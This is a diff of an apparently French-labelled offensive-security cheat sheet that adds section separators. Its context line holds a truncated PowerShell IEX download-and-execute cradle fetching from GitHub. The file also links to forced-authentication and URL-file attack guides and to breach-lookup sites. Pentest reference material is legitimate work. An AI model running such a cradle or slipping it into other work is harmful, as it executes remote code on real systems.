@@ -8,6 +8,7 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 
 # CYBER CHEAT SHEET
 
+---
 ### DIVERS
 ---
 **Ressources :**
@@ -29,17 +30,23 @@ C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
 - https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
 - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack
 
+<br/><br/>
+---
 ### OSINT - PASSWORD
 ---
 
 - https://haveibeenpwned.com/
 - https://breachdirectory.org/
 
+<br/><br/>
+---
 ### RECONNAISSANCE - ENUMERATION
 ---
 
 Todo
 
+<br/><br/>
+---
 ### MEMCM - MDT - PXE
 *******
 
